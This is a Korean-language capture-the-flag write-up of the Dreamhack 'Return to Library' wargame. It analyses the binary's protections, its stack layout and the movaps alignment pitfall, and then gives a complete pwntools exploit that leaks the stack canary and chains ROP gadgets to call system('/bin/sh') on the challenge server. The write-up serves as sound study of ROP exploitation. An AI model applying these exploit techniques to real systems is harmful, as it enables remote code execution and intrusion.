---
title: "[Dreamhack] Return to Library"
date: "2026-07-27T10:00:00"
last_modified_at: "2026-07-28 10:38:25"
canonical_id: "obsidian:hack/pwn/[Dreamhack] Return to Library.md"
categories: [Hack, Pwn]
tags: [ROP]
author: "hothyun"
description: "Dreamhack Return to Library 문제를 통해 ROP 공격 흐름과 가젯 구성, 스택 정렬 문제를 분석합니다."
image: "/assets/img/posts/preview/hack/pwn/pwn1.webp"
---


Dreamhack에서 학습을 하다가 NX, ASLR를 배우게 되면서 ROP에 대해서 알게 되었다. NX를 통해서 Stack 영역에 대해서 실행권한이 없어지자, 배열에다가 쉘코드를 적어서 exploit하는 것은 불가능하게 되었다. 그래서 이를 우회하기 위해 나온 방법이 ROP(Return-oriented programming)이다. 해당 방법에 대한 실습 문제를 풀게 되어서 정리할 예정이다.

오늘 내가 정리할 문제는 Dreamhack에서 풀 수 있는 워게임 중 하나인 Return to Library 문제이다. 문제 링크는 [여기](https://dreamhack.io/wargame/challenges/353) 있다.

## 문제 분석

일단, 문제 파일을 받고 어떤 파일들이 있는지를 분석해보자.

파일을 받았더니 총 2개의 파일이 있었다. `rtl` 파일과, `rtl.c` 파일이 있었다. `rtl.c` 파일은 `rtl` 파일을 gcc로 컴파일 한 파일임을 알 수 있었다.

일단 실행 파일을 `file` 명령어와 `checksec` 명령어를 이용하여 간단하게 분석해보자.

```bash
$ file ./rtl
$ checksec ./rtl
```

결과는 아래와 같았다.

```text
file ./rtl

./rtl: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a17643662cab9712713f3ff911dc0542865dc79a, not stripped

checksec ./rtl

Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

컴파일된 파일은 ELF 64-bit LSB executable 이다. 그리고 Arch에 amd64-64-little을 보니 64비트 운영체제에 little endian을 쓴다는 것을 알 수 있었다. 그리고 Canary found 라고 써진 것을 보니 Canary 보호 기법은 적용되어있고, NX enabled라고 적힌 것을 보니 Stack 영역에 실행 권한을 없앴다는 것을 알 수 있었다. 그런데 PIE가 No PIE(0x400000) 이다. 이것은 ASLR로 인해 Stack, Heap, libc 영역 등의 주소는 바뀌어도, 코드 조각이 있는 주소는 0x400000 기반으로 고정되어있다는 말이다. 마지막으로 Stripped: No는 코드 조각에서의 함수, 변수 이름 등이 그대로 남아있다는 뜻이다. 포너블 문제를 풀기 수월하게 세팅해둔 것 같다.

## 코드 분석

이제 코드를 분석할 차례다. 문제에서 내어준 코드가 있으니, 이를 분석해서 어디에 취약점이 있는지를 찾아보자.

```c
// Add system function to plt's entry
system("echo 'system@plt'");
```

먼저, `system("echo 'system@plt'")` 함수가 눈에 보인다. 이 함수는 plt의 엔트리에다가 system 함수를 추가하는 것을 의미한다. 추후에 gdb로 분석할 때, plt 명령어를 통해서 system 함수의 plt 주소를 찾으라는 것 같다.

```c
// Leak canary
printf("[1] Leak Canary\n");
printf("Buf: ");
read(0, buf, 0x100); // BOF
printf("Buf: %s\n", buf);
```

그리고 대놓고 Canary를 Leak 하라고 BOF를 할 수 있게 코드를 준다.

```c
// Overwrite return address
printf("[2] Overwrite return address\n");
printf("Buf: ");
read(0, buf, 0x100); // BOF
```

또, Canary를 Leak하고 Return Address를 덮어쓰라고 또 BOF를 할 수 있는 read 함수를 준다.

## Exploit 전략

이제 Exploit 전략을 짜보자. BOF 취약점이 있지만, Canary가 켜져있으므로 먼저 Canary를 얻어내야한다. 그리고 이 Leak 한 Canary를 정확한 위치에 포함하여 페이로드를 날려서 Canary 검증이 통과할 수 있게 해야한다.

Canary를 Leak 했으면, 이제 RET 주소를 어떻게 덮어쓸 지에 대한 전략을 짜야한다. ret 이라는 어셈블리는, `pop rip; jmp rip;` 이런 식으로 동작한다. rsp 위치에서 8바이트를 꺼내어서 rip에 저장하고, 해당 주소로 jump 하라고 시킨다. 따라서, rip에 적혀있는 주소에 **assembly gadget** 이 적혀있으면 추가로 어셈블리 동작을 진행하게 만들 수 있다.

따라서, ROP에서 많이 쓰는 ROPgadget 을 이용한 libc 함수 실행 전략을 사용하여 이 문제를 풀자.

자세한 exploit 전략은 Stack Frame을 분석하고 적겠다.

## GDB로 Stack Frame 분석하기

```bash
$ chmod +x ./rtl # 실행권한이 없으면 추가
$ gdb ./rtl
```

위 커맨드를 이용하여 gdb를 실행시키자. 여기서 main에 breakpoint를 걸고, run을 시키고 breakpoint가 걸리면 disassemble을 통해서 스택 프레임 구조를 파악하자.

```text
0x00000000004006fb <+4>:     sub    rsp,0x40
0x00000000004006ff <+8>:     mov    rax,QWORD PTR fs:0x28
0x0000000000400708 <+17>:    mov    QWORD PTR [rbp-0x8],rax
```

disassemble로 보아하니, 처음에 0x40만큼 메모리를 할당하고, fs:0x28에서 카나리를 가져와서 rbp-0x8 위치로부터 8바이트 기재한다.

```text
0x0000000000400772 <+123>:   lea    rax,[rbp-0x40]
0x0000000000400776 <+127>:   mov    edx,0x100
0x000000000040077b <+132>:   mov    rsi,rax
0x000000000040077e <+135>:   mov    edi,0x0
0x0000000000400783 <+140>:   call   0x4005f0 <read@plt>
```

read할 때 lea rax, [rbp-0x40] 을 하는 것을 보니 buf의 위치는 rbp-0x40 으로 확정되었다.

그렇다면 현재 구조는, 아래와 같다.

- rbp-0x40 ~ rbp-0x11: buf
- rbp-0x10 ~ rbp-0x9: 8 bytes padding
- rbp-0x8 ~ rbp-0x1: 8 bytes Canary
- rbp ~ rbp+0x7: 8 bytes SFP
- rbp+0x8 ~ rbp+0xf: 8 bytes RIP

이렇게 되어있다. 이제 이 구조를 보고 exploit 전략을 더 구체하게 세워보자.

## Exploit

위에서 말했듯, 우리는 assembly gadget을 이용하여 libc에 있는 system 함수를 실행시켜 쉘을 획득해야한다. 이를 위해서는 RIP 주소 및 그 이상의 주소를 잘 덮어쓰는 것이 중요하다.

먼저, rbp+0x8 ~ rbp+0xf 영역인 RIP 영역을 어떻게 덮을 지 생각해보자.

일단, system 함수를 실행시킬건데, system 함수의 첫 번째 인자가 "/bin/sh" 이런 식으로 전달이 되어야 한다. 따라서 rdi를 설정하는 과정이 필요하다. 따라서 gadget에 rdi가 들어가고, ret를 함으로써 단순히 어셈블리 가젯에서 끝나는 게 아니라, 추가로 Stack의 높은 주소 영역이 실행되게 해야한다.

따라서, `pop rdi; ret;` 가젯을 찾아보자.

```bash
$ ROPgadget --binary ./rtl --re "pop rdi" 
```

위 명령어는 ROPgadget을 찾아주는 기능을 가지고 있다. ROPgadget 라이브러리를 설치하면 쉽게 가젯을 찾을 수 있다. `--re` 플래그는 정규식 플래그이다. 따라서, `pop rdi`가 포함된 가젯을 찾는다. 이를 실행하니 아래와 같은 결과가 나온다.

```text
Gadgets information
============================================================
0x0000000000400853 : pop rdi ; ret

Unique gadgets found: 1
```

우리가 원했던 그 가젯을 찾았다. 이 가젯의 주소는 0x0000000000400853 여기라고 한다.

이제 흐름을 따라가면서 다음번엔 어떻게 해야할 지를 생각해보자. 일단 main함수가 끝이 났다고 가정하자. 그러면 함수의 에필로그를 거치면서 rsp가 현재 우리가 정한 offset 기준으로 rbp+0x8(RIP 영역) 까지 온다. 여기서 ret이 일어난다. ret이 일어나면, 현재 rsp로부터 8바이트 빼서 rip 레지스터에 넣고, jmp rip를 통해서 해당 주소로 jump 한다. 우리는 현재 이 rbp+0x8~rbp+0xf 주소에 우리가 아까 찾은 pop rdi; ret 가젯을 넣었다. 그렇다면 이제 어떻게 되는가?

먼저 ret이 일어났기 때문에 pop rip로 인해 rsp는 rbp+0x10이 되었을 것이다. 따라서, 여기서 pop rdi; 를 진행하면, rbp+0x10~rbp+0x17 영역의 8바이트 값을 읽어서 rdi 값에 저장할 것이다. 따라서 우리는 rbp+0x10~rbp+0x17 영역에 "/bin/sh"의 주소 값을 넣어야 함을 알 수 있다. 이 과정이 진행되면서 rsp의 값은 rbp+0x18로 높아지게 된다.

그리고, ret이 진행된다. ret이 진행되면서 pop rip가 되며 rsp 값이 rbp+0x20이 된다. 그리고, jmp rip가 되면서 rbp+0x18~rbp+0x1f 영역의 8바이트가 rip 가 저장되고, 그 주소로 jump 한다. 따라서, rbp+0x18~rbp+0x1f 영역에 system 함수의 libc 주소가 필요함을 알게 되었다.

그런데, 여기서 문제가 하나 발생한다. Ubuntu 18.04 이상의 system() 함수 내부에서는 16바이트 스택 정렬 규칙이 적용된다. 이 이유는 system 함수 어셈블리 내에 있는 movaps 라는 어셈블리 명령어 때문이다.

### movaps

movaps는 x86-64 CPU 내부에 존재하는 XMM 레지스터(16바이트) 라는 고성능 레지스터 와 16바이트 크기의 데이터 사이에 복사하는 명령어이다. 이는 성능 최적화를 위해 보통 사용되며, system에서도 그런 이유로 사용이 되었다.

그런데, movaps는 16바이트 버스를 통해 메모리와 레지스터 사이에서 데이터를 고속으로 주고받기 때문에, 데이터가 접근하는 메모리의 시작 주소가 정확히 16의 배수 지점에 배치되어 있어야 CPU 내부 회로가 한 번의 버스 사이클로 깔끔하게 읽고 쓸 수 있다. 따라서, 인텔/AMD 설계자들은 movaps 명령어를 만들 때 아예 강제 규칙을 걸어두었다. 만약 메모리 주소가 16의 배수가 아닌 상태로 movaps를 실행하면, 하드웨어 차원에서 GPF(General Protection Fault) 예외를 발생시켜서 프로그램을 즉시 강제 종료하게 말이다.

그렇다면 현재 system 함수에는 movaps가 존재하는가? 이를 한번 알아보자.

### system 함수 내부 어셈블리 파헤치기

파헤치는 법은 간단하다. gdb에서 `disassemble system` 명령어를 사용해주면 된다. 사용 결과 아래와 같이 나온다.

```text
Dump of assembler code for function __libc_system:
0x00007ffff7c58750 <+0>:     endbr64
0x00007ffff7c58754 <+4>:     test   rdi,rdi
0x00007ffff7c58757 <+7>:     je     0x7ffff7c58760 <__libc_system+16>
0x00007ffff7c58759 <+9>:     jmp    0x7ffff7c582d0 <do_system>
0x00007ffff7c5875e <+14>:    xchg   ax,ax
0x00007ffff7c58760 <+16>:    sub    rsp,0x8
0x00007ffff7c58764 <+20>:    lea    rdi,[rip+0x172ccc]        # 0x7ffff7dcb437
0x00007ffff7c5876b <+27>:    call   0x7ffff7c582d0 <do_system>
0x00007ffff7c58770 <+32>:    test   eax,eax
0x00007ffff7c58772 <+34>:    sete   al
0x00007ffff7c58775 <+37>:    add    rsp,0x8
0x00007ffff7c58779 <+41>:    movzx  eax,al
0x00007ffff7c5877c <+44>:    ret
End of assembler dump.
```

여기에는 따로 movaps는 안 보이는데, do_system을 call 하는 흔적이 보이고, 그 전에 sub rsp, 0x8로 rsp의 주소를 0x8을 낮췄다가, 다시 add rsp, 0x8로 올리는 것이 포착된다.

do_system으로 한번 들어가보자. 똑같이 `disassemble do_system` 명령어를 입력하면 된다. 결과는 매우 긴데, 조금만 추려보면,

```text
...
0x00007ffff7c58428 <+344>:   lea    rsi,[rip+0x173000]        # 0x7ffff7dcb42f
0x00007ffff7c5842f <+351>:   mov    QWORD PTR [rsp+0x70],0x0
0x00007ffff7c58438 <+360>:   mov    r9,QWORD PTR [rax]
0x00007ffff7c5843b <+363>:   movaps XMMWORD PTR [rsp+0x50],xmm0
0x00007ffff7c58440 <+368>:   call   0x7ffff7d0ecd0 <__GI___posix_spawn>
0x00007ffff7c58445 <+373>:   mov    rdi,rbx
0x00007ffff7c58448 <+376>:   mov    r12d,eax
...
```

이와 같이 movaps가 있는 것을 볼 수 있다. rsp+0x50과 같이 할당되는 값들이 모두 16의 배수로 할당이 된다. 따라서 이를 통해 알 수 있는 점은, **system 함수가 실행되는 시점의 rsp에서 0x8만큼 뺀 주소값이 16의 배수 값이어야만 에러 없이 system 함수를 쓸 수 있다** 는 것이다. 아까 sub rsp, 0x8 때문에 그렇다.

그럼 이제 돌아와서, 현재 우리의 상황을 보자.

지금 ret을 한 상태이다. ret을 하니 rsp의 주소는 rbp+0x20으로 바뀌었고, 여기서 jmp rip를 하니, 지금 이 기준으로 보았을 때 system 함수를 실행할 때, sub rsp, 0x8을 하게 되면 rsp의 값이 16의 배수가 아니게 된다. 따라서, 이 경우 system 함수를 거치다가 GPF 에러가 나면서 system 함수를 사용할 수 없게 된다.

따라서, 이를 우회하기 위해 일부러 ret을 한번 더 시켜준다. 따라서, 기존의 RIP(rbp+0x8~rbp+0xf) 주소에다가 ret; 만 하는 어셈블리 가젯을 넣고, rbp+0x10~0x17 부터 우리가 넣고자 했던 어셈블리 가젯을 넣으면, system에 rsp 16배수 검증을 통과할 수 있게 되면서 문제를 풀 수 있다.

최종적으로 정리하면,

- rbp-0x40 ~ rbp-0x11: Dummy Buf(b"A"*0x30)
- rbp-0x10 ~ rbp-0x9: 8 bytes padding(b"B"*0x8)
- rbp-0x8 ~ rbp-0x1: 8 bytes Canary(Leaked Canary)
- rbp ~ rbp-0x7: 8 bytes Dummy SFP(b"C"*0x8)
- rbp+0x8 ~ rbp+0xf: `ret;` assembly gadget
- rbp+0x10 ~ rbp+0x17: `pop rdi; ret;` assembly gadget
- rbp+0x18 ~ rbp+0x1f: "/bin/sh" address
- rbp+0x20 ~ rbp+0x27: system function libc address

이렇게 payload를 짜서 BOF를 해주면 문제를 풀 수 있다. 

마지막으로 /bin/sh의 address와 system function의 address까지 구해보자.

```text
pwndbg> search /bin/sh
Searching for byte: b'/bin/sh'
rtl             0x400874 0x68732f6e69622f /* '/bin/sh' */
rtl             0x600874 0x68732f6e69622f /* '/bin/sh' */
libc.so.6       0x7ffff7dcb42f 0x68732f6e69622f /* '/bin/sh' */
```

gdb에다가 `search /bin/sh` 를 통해서 쉽게 0x400874 주소에 /bin/sh가 있다는 것을 알아내준다.

```text
pwndbg> plt
Section .plt 0x4005a0 - 0x400610:
0x4005b0: puts@plt
0x4005c0: __stack_chk_fail@plt
0x4005d0: system@plt
0x4005e0: printf@plt
0x4005f0: read@plt
0x400600: setvbuf@plt
```

gdb에다가 plt 명령어를 통해서 쉽게 0x4005d0 주소가 system 함수의 plt 주소임을 알아내준다.

### Exploit 코드 짜기

이제 마지막으로 코드를 짤 시간이다.

```python
# leak canary
cnry_payload = b"A"*0x39 # canary는 rbp-0x8~rbp-0x1 까지 있으며 마지막 바이트는 널 바이트이다.
# 현재 buf의 시작 위치는 rbp-0x40 이므로, 0x39 까지 dummy로 채우면, printf의 널 바이트 미확인 시 계속 출력되는 성질을 이용하여 카나리 7바이트 leak 가능

r.sendafter(b"Buf: ", cnry_payload)
r.recvuntil(cnry_payload)

cnry = b"\x00" + r.recvn(7) # canary 상위 7바이트 leak 완료
log.info(f"cnry: {cnry}")
```

printf은 널 바이트 확인 시 출력을 멈춘다. 그래서 임의로 canary의 마지막 바이트를 변경한다. canary의 마지막 바이트는 널 바이트인데, little endian 구조이므로 딱 canary의 가장 낮은 주소가 널 바이트이다. 이를 덮어주기 위해 총 0x39만큼의 더미를 넣는다.

```python
# ROP
offset = b"B"*0x38 + cnry + b"C"*0x8 # buf + padding + canary + SFP
ret_gadget_address = p64(0x0000000000400596) # ROPgadget으로 얻은 ret; 만 있는 가젯 주소
pop_rdi_gadget_address = p64(0x0000000000400853) # pop rdi; ret 가젯 주소
binsh_address = p64(0x0000000000400874) # /bin/sh 문자열 주소
system_plt_address = p64(0x00000000004005d0) # system libc 함수 주소

payload = offset + ret_gadget_address + pop_rdi_gadget_address + binsh_address + system_plt_address

r.sendafter(b"Buf: ", payload)
```

이제 ROP를 적용하기 위해 각각의 주소들을 모두 모아서 BOF를 시전한다. 전체 코드는 아래와 같다.

```python
from pwn import *

r = remote(<HOST>, <PORT>)

# leak canary
cnry_payload = b"A"*0x39 # canary는 rbp-0x8~rbp-0x1 까지 있으며 마지막 바이트는 널 바이트이다.
# 현재 buf의 시작 위치는 rbp-0x40 이므로, 0x39 까지 dummy로 채우면, printf의 널 바이트 미확인 시 계속 출력되는 성질을 이용하여 카나리 7바이트 leak 가능

r.sendafter(b"Buf: ", cnry_payload)
r.recvuntil(cnry_payload)

cnry = b"\x00" + r.recvn(7) # canary 상위 7바이트 leak 완료
log.info(f"cnry: {cnry}")

# ROP
offset = b"B"*0x38 + cnry + b"C"*0x8 # buf + padding + canary + SFP
ret_gadget_address = p64(0x0000000000400596) # ROPgadget으로 얻은 ret; 만 있는 가젯 주소
pop_rdi_gadget_address = p64(0x0000000000400853) # pop rdi; ret 가젯 주소
binsh_address = p64(0x0000000000400874) # /bin/sh 문자열 주소
system_libc_address = p64(0x00000000004005d0) # system libc 함수 주소

payload = offset + ret_gadget_address + pop_rdi_gadget_address + binsh_address + system_libc_address

r.sendafter(b"Buf: ", payload)

r.interactive()
```

이렇게 exploit을 진행해서 얻은 쉘에서 `ls`를 하고, flag를 위치를 찾은 뒤, `cat flag`를 통해서 flag 탈취를 성공했다!
